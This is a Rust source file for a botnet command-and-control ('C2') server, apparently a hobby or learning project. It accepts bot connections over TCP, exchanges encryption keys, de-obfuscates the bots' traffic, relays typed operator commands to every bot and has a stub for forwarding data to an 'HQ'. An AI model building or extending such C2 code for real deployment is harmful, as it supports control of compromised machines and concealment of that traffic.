extern crate core;
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt, BufReader, Interest, ReadBuf},
    macros::support::poll_fn,
    sync::{
        broadcast,
        broadcast::Receiver,
        broadcast::Sender
    },
    net::tcp::OwnedWriteHalf
};
use std::{io, slice, net::SocketAddr, process::Command, ptr::slice_from_raw_parts, str::{EscapeDebug, from_utf8}, thread, net, future};
use std::error::Error;
use std::sync::mpsc;
use serde::{Deserialize, Serialize};
use rmp_serde::{Deserializer, Serializer};
use base32;
use std::future::Future;
use std::thread::JoinHandle;
use tokio::sync::broadcast::error::TryRecvError;

use crate::communication::bot::{Bot, Device_stream};
use crate::communication::rsa_encryption;
use crate::morse;
use crate::communication::lib;
use crate::communication::data_processing as dp;
use crate::communication::data_processing::{obfuscate_data, serialize_data};
use super::bot;

const HQ: &str = "127.0.0.1:6969";

const LOCAL: &str = "127.0.0.1:6000";
const MSG_SIZE: usize = 4096;
const USERNAME_LENGTH: usize = 10;
const IV_LEN: usize = 16;

async fn handle_message_received(DS: &mut bot::Device_stream, socket: &tokio::net::TcpStream) -> Vec<u8> {
    let mut buffer = [0; MSG_SIZE];
    loop {
        socket.readable().await;
        match socket.try_read(&mut buffer) {
            Ok(0) => {
                //println!("Client {} (username : {:?}) disconnected", DS.ip_address, from_utf8(&DS.M.Username).unwrap());
                DS.connected = false;
                return vec![];
            }
            Ok(recv_bytes) => {
                println!("Received bytes: {}", recv_bytes);
            }
            Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                // edode : Avoid returning an empty vector (empty Incoming_Message)
                println!("Error: {}", e);
                //continue;
            }
            Err(e) => {
                println!("Error: {}", e);
            }
        };
        println!("buffer readyo : {:?}", buffer);
        return buffer.to_vec();
    };
}

async fn authenticate_new_user(socket: &tokio::net::TcpStream, addr: SocketAddr) -> bot::Device_stream {
    let mut DS = Device_stream::new(
        addr,
        false,
        true,
        Vec::new(),
        bot::Bot::new(Vec::new(), Vec::new())
    );
    let data = handle_message_received(&mut DS, socket).await;
    if DS.connected {
        let encryption_key = dp::deobfuscate_data(data, false, &DS.encryption_key);
        println!("data : {:?}", encryption_key);
        DS.B = dp::deserialize_message(encryption_key);
        DS.encryption_key = DS.B.com.data.clone();
    }
    return DS;
}

async fn handle_message_from_client(
    mut DS: bot::Device_stream,
    mut c2_tx: Sender<bot::Device_stream>,
    mut cmd_rx: Receiver<bot::Device_stream>,
    mut socket: tokio::net::TcpStream,
) -> io::Result<()> {

    let mut buffer: [u8; 4096] = [0; MSG_SIZE];
    let mut bf: [u8; 4096] = [0; MSG_SIZE];

    loop {
        match socket.try_read(&mut buffer) {
            Ok(n) if n == 0 => {
                //println!("Client {} (username : {:?}) disconnected", DS.ip_address, from_utf8(&DS.B.uid).unwrap());
                DS.connected = false;
            },
            Ok(recv_bytes) => { // edode : Deobfuscating data and sending it to the HQ
                let marshaled_data = dp::deobfuscate_data(buffer.to_vec(), true, &DS.encryption_key);
                DS.B = dp::deserialize_message(marshaled_data);
                c2_tx.send(DS.clone()).unwrap();
                buffer
                    .iter_mut()
                    .for_each(|x| *x = 0); // reset buffer
            },
            Err(ref err) if err.kind() == io::ErrorKind::WouldBlock => {
                // edode : Avoid returning an empty vector (empty Incoming_Message)
                //println!("Error: {}", err);
                //continue; -> removing this allows to listen and to write commands
            },
            Err(err) => {
                println!("Error: {}", err);
            },
        };
        match cmd_rx.try_recv() {
            Ok(DS) => {
                println!("Received command from HQ");
                let serialized_data = serialize_data(&DS.B);
                let obfuscated_data = obfuscate_data(serialized_data, &DS.encryption_key);
                socket.write(obfuscated_data.as_slice()).await?;
            },
            _ => {}
        };
    }
    Ok(())
}

async fn client_input (
    tx: Sender<Device_stream>,
    mut DS: &mut bot::Device_stream,
) {
    loop {
        println!("-> ");
        let mut buff = String::new();
        io::stdin()
            .read_line(&mut buff)
            .expect("Did not entered a correct string");
        buff.pop();
        DS.B.com.command = buff.as_bytes().to_vec();

        tx.send(DS.clone()).unwrap(); // edode : Data has to be sent to the bots
    }
}

async fn receive_bot_data(
    mut bot_rx: Receiver<bot::Device_stream>,
    //hq_tx: TcpStream
) {
    loop {
        match bot_rx.try_recv() {
            Ok(mut received_data) => {
                println!("Received data from channel : {:?} from : {:?}", received_data.B, received_data.ip_address);
                println!("Sending Data to Commanding C2");
                // lisandro : write the code for sending it to HQ
                //hq_tx.send(received_data);
            },
            Err(err) => {
                // edode : empty channel
                //println!("Could not receive data : {}", err);
            },
        };
    }
}

#[tokio::main]
pub async fn main() -> Result<(), Box<dyn Error>> {
    let listener = tokio::net::TcpListener::bind(LOCAL).await?;
    let (chn_bot_tx, mut _chn_bot_rcv) = broadcast::channel(64);
    let (chn_c2_tx, mut _chn_c2_rx) = broadcast::channel(64);

    //let (bot_input_sender, bot_input_receiver) = broadcast::channel(64);
    println!("C2 Server Initialized");
    loop {
        // User accept
        let (socket, addr) = listener.accept().await?;

        println!("New user connected: {}", addr);
        let mut DS: bot::Device_stream = authenticate_new_user(&socket, addr).await;

        if !DS.connected { // edode : if the user could not authenticated, drop the connection
            drop(DS);
            continue;
        }
        let mut c_cmd = DS.clone();

        let mut bot_rcv = chn_bot_tx.subscribe();
        let bot_tx = chn_bot_tx.clone();

        let mut c2_rcv = chn_c2_tx.subscribe();
        let c2_tx = chn_c2_tx.clone();
        let tr = chn_c2_tx.clone();

        tokio::spawn(async move {
            handle_message_from_client(DS, bot_tx, c2_rcv, socket).await;
        });

        tokio::spawn(async move {
            receive_bot_data(bot_rcv).await;
        });

        tokio::spawn(async move {
            client_input(c2_tx, &mut c_cmd).await;
        });
    }
    Ok(())
}
